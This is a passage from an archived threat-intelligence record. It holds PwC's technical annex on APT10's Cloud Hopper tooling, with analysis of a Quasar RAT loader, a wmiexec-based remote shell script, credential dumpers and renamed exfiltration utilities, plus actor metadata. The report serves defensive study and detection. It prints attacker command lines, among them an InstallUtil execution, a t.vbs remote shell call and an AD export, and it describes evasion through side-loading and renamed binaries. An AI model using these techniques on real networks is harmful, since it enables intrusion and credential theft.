default\nvalues within the malware, the threat actor has been observed using the “tag” field to uniquely identify\nits victim organisations.\n\nWe identified the threat actor installing Quasar in victim environments with the following commands:\n\n```\n\"c:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\" /logfile=\n/LogToConsole=false /u \"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\WPF\\wpfetw.dat\"\n\n```\n```\nInstallUtil.exe is the legitimate .NET Framework Installer Tool that is digitally signed by\n\n```\nMicrosoft, and wpf-etw.dat is a 32-bit DLL compiled with .NET, which has been obfuscated using\nConfuserEx.[14] The main loop of the payload enumerates all files in C:\\Windows\\Microsoft.NET,\nreading each file over 300k in size, decoding it via AES and attempting to load it as an assembly.\n\nThe threat actor in this case placed the loader and the encoded file in separate directories, with the\nsecondary encoded blob in a parent directory of the loader, a technique used to increase the\ncomplexity of detecting the payload. In our observations the payload was located in\n```\nC:\\Windows\\Microsoft.NET named microsoft.workflow.compiler.dat.\n\n```\nDecoding the payload uncovers another .NET binary with an internal name of “Client.exe”. Analysis\nfound that there was a time delta of almost a month between the compile date of the loader and the\nlater compile date of the payload. This highlights that the loader operates independently from the\npayload, effectively trying to identify and launch any AES-encoded .NET assembly in the target\ndirectory or subdirectories.\n\nInitial analysis of the namespaces in the payload, show that the malware is in fact the open source\nQuasarRAT.[15] We confirmed this by comparing the source code from GitHub with binaries obtained\nfrom our research, shown for comparison in Figure 22 and Figure 23.\n\n14 [https://yck1509.github.io/ConfuserEx/](https://yck1509.github.io/ConfuserEx/)\n15 [https://github.com/quasar/QuasarRAT](https://github.com/quasar/QuasarRAT)\n\n\n-----\n\n**Figure 22: Payload namespaces**\n\n\n**Figure 23: GitHub source code tree**\n\n\nThe code itself has been obfuscated, with many class and function names converted to arbitrary\nUnicode strings. Key elements of the configuration can be decoded from the obfuscated code. The\nvariable names are obfuscated, and the variable contents are Base64 encoded and AES encrypted with\nthe AES key “nrgHOnEniJY9vpVZjS0Z”.\n\nApplying a decoder over these variables results in the shown in Figure 24 configuration block:\n\n**Figure 24: Quasar configuration**\n\n\n-----\n\nThis Quasar sample communicates with the following C2 domains:\n\n  - `ctldl.itunesmusic.jkub[.]com`\n\n  - `iamges.itunesmusic.jkub[.]com`\n\n  - `ipv4.itunesmusic.jkub[.]com`\n\n  - `v4.itunesmusic.jkub[.]com`\n\nAnalysis of this infrastructure shows other related subdomains which can be linked to APT10 activity.\n\n**Figure 25: Quasar C2 links to other APT10 domains**\n\nSince this sample was analysed we have identified several more domains linked to this infrastructure.\nThese have been added to the IOC list (Annex A) provided with the main Operation Cloud Hopper\nreport.\n\n\n-----\n\n### APT10: Scripts and Tools\n\nIn addition to the tactical and sustained malware used by APT10, we have also observed the use of\nmultiple freely available scripts and tools used to aid operations once access to the victim’s network is\nestablished.\n\n#### t.vbs\n\nWe have encountered the following script, t.vbs, which research has shown to be a modified version\nof the pentesting script known in open source as wmiexec.vbs.[16] The tool is used to execute a variety\nof commands on remote hosts, ranging from performing reconnaissance on the network, to dumping\ncredentials or executing malware. We have observed it being dropped into legitimate directories such\nas C:\\Recovery, C:\\Intel or C:\\PerfLogs.\n\nThe script has two main functions, “Single Command Mode”, and “Shell Command Mode”.\n\n**Figure 26: Single Command Mode**\n\nIn single command mode, the script logs the user into the remote machine using Windows\nManagement Instrumentation (WMI), and creates a Server Message Block (SMB) share, which is\nusually set to C:\\Windows or C:\\Windows\\TEMP.\n\nThe command will then be executed on the target system, and the output will be piped to a file within\nthe newly mounted drive as wmi.dll, which is not a DLL file as the name would suggest, but is instead\na dummy extension used to avoid detection.\n\nThe new wmi.dll file is then copied to another file called wmi.dll.bak in the same directory, and the\noriginal is removed. The content of this wmi.dll.bak file is then sent back to the host, by reading its\ncontents from the SMB share. Once the file has been read, wmi.dll.bak is deleted and the mounted\nSMB share is dropped.\n\nThe script is also capable of running as a reverse shell, which uses the same tactics as single command\nmode, but with some differences. Instead of executing a single command, receiving the output, and\ndropping the share, the threat actor is presented with a reverse shell prompt. With this reverse shell,\nthey are able to execute as many commands as they wish, and instead of removing the share after each\ncommand, the share is kept for the entire duration of the connection. The wmi.dll and wmi.dll.bak\nfiles are still created and deleted after each command.\n\nAn example command is shown:\n\n16 [https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs)\n\n\n-----\n\n```\ncscript.exe //nologo t.vbs /shell target_IP target_username target_password\n\n```\n**Figure 27: An example of the t.vbs reverse shell**\n\nComparison of t.vbs and the original wmiexec.vbs, revealed that both scripts were almost identical,\nwith the exception of:\n\n  - `wmiexec.vbs contains a help option, which will display all of the possible commands that can`\nbe used. This is missing from t.vbs, most likely to hide the functionality of the file to anyone\nwho discovers it, and to reduce the file size.\n\n  - `t.vbs contains an option to save the output of the executed command by adding the -`\n```\n    saveresult argument, and saves wmic.dll into the SMB share. \n\n```\nCommands issued via t.vbs can sometimes be retrieved from the memory or pagefile of the target\nsystem. After dumping strings from a memory image, the commands can be identified by searching\nfor strings containing “wmi.dll 2>&1”.\n\n#### Detect.vbs\n\nAnother script used by APT10, detect.vbs, is a Visual Basic Script file which includes network\ndiscovery functionality. Once detect.vbs is executed, it decodes and drops two Base64 encoded\nbinary files which are then decoded using Microsoft’s certutil.exe. These two files are dropped on\nthe system in the same location as the script. The first of these two files, subnet.exe, is used to\nenumerate subnets defined in the VBscript, while the second of these two files, rund1132.exe, is\n```\ntcping.exe as described later below. As part of the script, it builds an array of IP addresses based off\n\n```\npreconfigured ranges.\n\nThe purpose of this script is to detect and scan other systems which may be used by the threat actor to\nconduct lateral movement. In the version we recovered from a compromised system, the script\ncontained the IP ranges of the victim’s MSP, indicating that they are specifically targeting the\nprovider. The script is highly likely used post-compromise.\n\n#### Mpsvc.dll \n```\nMpsvc.dll is a file used by APT10 to launch a repacked version of the open-source post-exploitation\n\n```\ntool Mimikatz. The tool is able to extract plaintext passwords, hashes and Kerberos tickets from\nmemory.[17]\n\n17 [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)\n\n\n-----\n\nThe DLL is sideloaded by the legitimate 64-bit Windows binary “MsMpEng.exe”. This binary has been\nused by the threat actor to install PlugX, as is mentioned in the targeted executables table.\n`MsMpEng.exe` is the core binary file for Microsoft’s pre-installed AntiVirus software “Windows\nDefender”.\n\nMimikatz is frequently used in interactive intrusion operations, although this is the first time we have\nobserved it being side loaded.\n\n#### consl64.exe \n\nThis is actually a DLL file containing a repacked version of another credential dumping tool,\nPwDump6. PwDump6 is able to extract NTLM and LanMan hashes from a target Windows system,\nand can also dump password histories if available.[18] It uses a similar tactic to Mpsvc.dll to inject\nitself into memory by side-loading through legitimate Lexmark printer software.\n\n#### csvde.exe \n```\ncsvde.exe is a legitimate Microsoft administration command line tool used to import and export data\n\n```\nfrom Active Directory (AD) Services.[19] It is of note that this binary requires elevated permissions as\nwell as the AD Services (alternative AD Lightweight Directory Services) role to execute correctly.\n\nAPT10 has been observed using it to export region specific AD data via the following command:\n\n```\ncmd /c “csvde -f C:\\windows\\web\\[REGION].log”\n\n```\n\nThis was run multiple times and resulted in the actor likely mapping out User and Host Names for the\nnetwork.\n\n#### nbt.exe\n```\nnbt.exe was identified to be a copy of nbtscan or NetBIOS scanner.[20] NetBIOS scanner is a portable\n\n```\nC-based tool designed to scan for open Netbios nameservers on a local or remote network. NetBIOS\nhas been leveraged by APT10 to search for services of interest across the IT estate, footprinting\nendpoints of interest. NetBIOS can be used to identify system information such as host names and any\navailable file shares.\n\n#### tcping.exe \n```\ntcping.exe is a freely available online tool by the same name.[21] While described by the author as a\n\n```\n“console application that operates similarly to ‘ping’, it works over a TCP port.” Analysis showed\nAPT10 using the tool to probe for port status on specific hosts of interest. It was observed probing\nports 445 and 3389, attempting to assess the status of file sharing services and RDP respectively.\n\n#### psexe.exe \n\nAPT10 was also seen to be using PsExec, a core application from the “Sysinternals” tool set.[22] PsExec\nis designed to be a lightweight, dependency free, telnet replacement which will allow the user to\nexecute programs or applications on a remote host. PsExec is an attractive tool of choice for any threat\n\n18 [https://github.com/mcandre/fgdump/blob/c883704e5e34d7aa8fce6fb0a0777df3ebb693ac/pwdump6/pwservice.cpp](https://github.com/mcandre/fgdump/blob/c883704e5e34d7aa8fce6fb0a0777df3ebb693ac/pwdump6/pwservice.cpp)\n19 [https://technet.microsoft.com/en-us/library/cc732101(v=ws.11).aspx](https://technet.microsoft.com/en-us/library/cc732101(v=ws.11).aspx)\n20 [http://www.unixwiz.net/tools/nbtscan.html](http://www.unixwiz.net/tools/nbtscan.html)\n21 [https://www.elifulkerson.com/projects/tcping.php](https://www.elifulkerson.com/projects/tcping.php)\n22 [https://technet.microsoft.com/en-gb/sysinternals/bb897553.aspx](https://technet.microsoft.com/en-gb/sysinternals/bb897553.aspx)\n\n\n-----\n\nactor given the level of interaction it facilitates without the need to install any additional client\nsoftware.\n\n#### NetSess.exe\n\nNetSess is a freely available command line tool of the same name used to enumerate NetBIOS sessions\non a specified machine.[23] APT10 was observed using the tool to conduct network reconnaissance of\nthe victim’s environment.\n\n#### rundll32.exe \n```\nrundll32.exe is a renamed legitimate PSCP client that normally comes bundled with PuTTY.[24] It had\n\n```\nbeen renamed from pscp.exe to rundll32.exe to hide its true nature from analysts. APT10 was\nobserved using this tool to exfiltrate data from victim networks.\n\n#### svchost.exe \n```\nsvchost.exe is the 64-bit, Chinese simplified console application of rar.exe, version 5.30, released\n\n```\n18th November 2015, which is legitimate Winrar software.[25] `rar.exe was almost certainly renamed to`\n```\nsvchost.exe to hide its true nature from analysts. APT10 used this software to compress files before\n\n```\nexfiltration from victim networks.\n\n23 [http://www.joeware.net/freetools/tools/netsess/index.htm](http://www.joeware.net/freetools/tools/netsess/index.htm)\n24 [http://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html](http://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html)\n25 [http://www.rarlab.com/](http://www.rarlab.com/)\n\n\n-----\n\n### CoreImpact Tools\n\nOur analysis has identified that APT10 uses a number of tools normally packaged within CoreImpact,\na commercial penetration testing suite. These tools have been converted into executable binaries using\nPyInstaller, meaning that they can be executed on any system.\n\n#### secretsdump.exe \n```\nsecretsdump.exe was compiled from secretsdump.py, a credential dumping tool able to “perform\n\n```\n_various techniques to dump secrets from the remote machine without executing any agent there”.[ 26]_\n\n#### atexec.exe \n```\natexec.exe, originally atexec.py, is a script able to execute an arbitrary command on a remote\n\n```\ntarget machine through the Task Scheduler service, and return the output of that command to the\nhost.[27]\n\n#### psexec.exe \n\nThis tool has functionality very similar to the Windows “Sysinternals” tool psexec.exe, which is used\nto remotely execute administration commands. The tool is compiled from psexec.py[28] and uses the\nopen source psexec replacement program RemCom[29] to execute commands without the need to install\nany client software.\n\n26 [https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py](https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py)\n27 [https://www.coresecurity.com/corelabs-research/open-source-tools/impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket)\n28 [https://github.com/CoreSecurity/impacket/blob/impacket_0_9_13/examples/psexec.py](https://github.com/CoreSecurity/impacket/blob/impacket_0_9_13/examples/psexec.py)\n29 [https://github.com/kavika13/RemCom](https://github.com/kavika13/RemCom)\n\n\n-----\n\n### Recommendations\n\nGiven the scale and scope of the campaigns outlined in our Operation Cloud Hopper report, we\nrecommend that organisations use the indicators provided in Annex A to protect their systems and\nidentify potential compromises. This includes blacklisting them, searching historical logs, and\nadditionally, ensuring that anti-virus or anti-malware applications are up-to-date and running.\n\nAdditionally, staff at organisations who may be targeted should also be aware that there is a\nheightened risk from this threat actor at the present time.\n\nAs we have outlined in the report, this campaign serves to highlight the importance of organisations\nhaving a comprehensive view of their threat profile, including that of their supply chains. APT10’s\nactivities further point to the need for independent access to threat intelligence, incident response\nand, threat detection and monitoring capabilities.\n\nGiven the upturn in retooling tempo over the last six months, it is clear that there is a need for cyber\nsecurity researchers to intensify activity and collaboration in research into this threat actor, to develop\na full and holistic view of APT10’s tools, techniques and procedures.\n\n\n-----\n\nThis publication has been prepared for general guidance on matters of interest only, and does not constitute\nprofessional advice. You should not act upon the information contained in this publication without obtaining\nspecific professional advice. No representation or warranty (express or implied) is given as to the accuracy or\ncompleteness of the information contained in this publication, and, to the extent permitted by law,\nPricewaterhouseCoopers LLP, its members, employees and agents do not accept or assume any liability,\nresponsibility or duty of care for any consequences of you or anyone else acting, or refraining to act, in reliance\non the information contained in this publication or for any decision based on it.\n\n© 2017 PricewaterhouseCoopers LLP. All rights reserved. In this document, “PwC” refers to the UK member firm,\nand may sometimes refer to the PwC network. Each member firm is a separate legal entity. Please see\nwww.pwc.com/structure for further details.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf"
    ],
    "report_names": [
        "pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf"
    ],
    "threat_actors": [
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ec14074c-8517-40e1-b4d7-3897f1254487",
            "created_at": "2023-01-06T13:46:38.300905Z",
            "updated_at": "2025-03-27T02:00:02.799108Z",
            "deleted_at": null,
            "main_name": "APT10",
            "aliases": [
                "TA429",
                "STONE PANDA",
                "POTASSIUM",
                "Red Apollo",
                "HOGFISH",
                "Cloud Hopper",
                "BRONZE RIVERSIDE",
                "ATK41",
                "G0045",
                "Menupass Team",
                "happyyongzi",
                "CVNX",
                "Granite Taurus"
            ],
            "source_name": "MISPGALAXY:APT10",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ba3fff0c-3ba0-4855-9eeb-1af9ee18136a",
            "created_at": "2022-10-25T15:50:23.298889Z",
            "updated_at": "2025-03-27T02:00:55.433541Z",
            "deleted_at": null,
            "main_name": "menuPass",
            "aliases": [
                "menuPass",
                "POTASSIUM",
                "Stone Panda",
                "APT10",
                "Red Apollo",
                "CVNX",
                "HOGFISH",
                "BRONZE RIVERSIDE"
            ],
            "source_name": "MITRE:menuPass",
            "tools": [
                "certutil",
                "FYAnti",
                "UPPERCUT",
                "SNUGRIDE",
                "P8RAT",
                "RedLeaves",
                "SodaMaster",
                "pwdump",
                "Mimikatz",
                "PlugX",
                "PowerSploit",
                "ChChes",
                "cmd",
                "QuasarRAT",
                "AdFind",
                "Cobalt Strike",
                "PoisonIvy",
                "EvilGrab",
                "esentutl",
                "Impacket",
                "Ecipekac",
                "PsExec",
                "HUI Loader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ba9fa308-a29a-4928-9c06-73aafec7624c",
            "created_at": "2024-05-01T02:03:07.981061Z",
            "updated_at": "2025-03-27T02:05:17.28602Z",
            "deleted_at": null,
            "main_name": "BRONZE RIVERSIDE",
            "aliases": [
                "CTG-5938 ",
                "CVNX ",
                "Hogfish ",
                "MenuPass ",
                "POTASSIUM ",
                "Red Apollo ",
                "Stone Panda ",
                "APT10 "
            ],
            "source_name": "Secureworks:BRONZE RIVERSIDE",
            "tools": [
                " ChChes",
                " Cobalt Strike",
                " PlugX",
                " PoisonIvy",
                " QuasarRAT",
                " QuasarRAT Loader",
                " RedLeaves",
                "ANEL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "04b07437-41bb-4126-bcbb-def16f19d7c6",
            "created_at": "2022-10-25T16:07:24.232628Z",
            "updated_at": "2025-03-27T02:02:10.146043Z",
            "deleted_at": null,
            "main_name": "Stone Panda",
            "aliases": [
                "APT 10",
                "ATK 41",
                "Bronze Riverside",
                "CTG-5938",
                "CVNX",
                "Cuckoo Spear",
                "Earth Kasha",
                "Granite Taurus",
                "Happyyongzi",
                "Hogfish",
                "ITG01",
                "Operation A41APT",
                "Operation Cache Panda",
                "Operation ChessMaster",
                "Operation Cloud Hopper",
                "Operation Cuckoo Spear",
                "Operation New Battle",
                "Operation Soft Cell",
                "Operation TradeSecret",
                "Potassium",
                "Red Apollo",
                "Stone Panda",
                "TA429",
                "menuPass",
                "menuPass Team"
            ],
            "source_name": "ETDA:Stone Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "Anel",
                "AngryRebel",
                "BKDR_EVILOGE",
                "BKDR_HGDER",
                "BKDR_NVICM",
                "BUGJUICE",
                "CHINACHOPPER",
                "ChChes",
                "China Chopper",
                "Chymine",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "DARKTOWN",
                "DESLoader",
                "DILLJUICE",
                "DILLWEED",
                "Darkmoon",
                "DelfsCake",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "Ecipekac",
                "Emdivi",
                "EvilGrab",
                "EvilGrab RAT",
                "FYAnti",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "GreetCake",
                "HAYMAKER",
                "HEAVYHAND",
                "HEAVYPOT",
                "HTran",
                "HUC Packet Transmit Tool",
                "Ham Backdoor",
                "HiddenFace",
                "Impacket",
                "Invoke the Hash",
                "KABOB",
                "Kaba",
                "Korplug",
                "LODEINFO",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MiS-Type",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "NBTscan",
                "NOOPDOOR",
                "Newsripper",
                "P8RAT",
                "PCRat",
                "PlugX",
                "Poison Ivy",
                "Poldat",
                "PowerSploit",
                "PowerView",
                "PsExec",
                "PsList",
                "Quarks PwDump",
                "Quasar RAT",
                "QuasarRAT",
                "RedDelta",
                "RedLeaves",
                "Rubeus",
                "SNUGRIDE",
                "SPIVY",
                "SharpSploit",
                "SigLoader",
                "SinoChopper",
                "SodaMaster",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "UpperCut",
                "Vidgrab",
                "WinRAR",
                "WmiExec",
                "Wmonder",
                "Xamtrav",
                "Yggdrasil",
                "Zlib",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "dfls",
                "lena",
                "nbtscan",
                "pivy",
                "poisonivy",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1682474968,
    "ts_updated_at": 1743041834,
    "ts_creation_date": 1491471585,
    "ts_modification_date": 1630415457,
    "files": {
        "pdf": "https://archive.orkl.eu/730434022203015a57c697880774ef7fbf27ad09.pdf",
        "text": "https://archive.orkl.eu/730434022203015a57c697880774ef7fbf27ad09.txt",
        "img": "https://archive.orkl.eu/730434022203015a57c697880774ef7fbf27ad09.jpg"
    }
}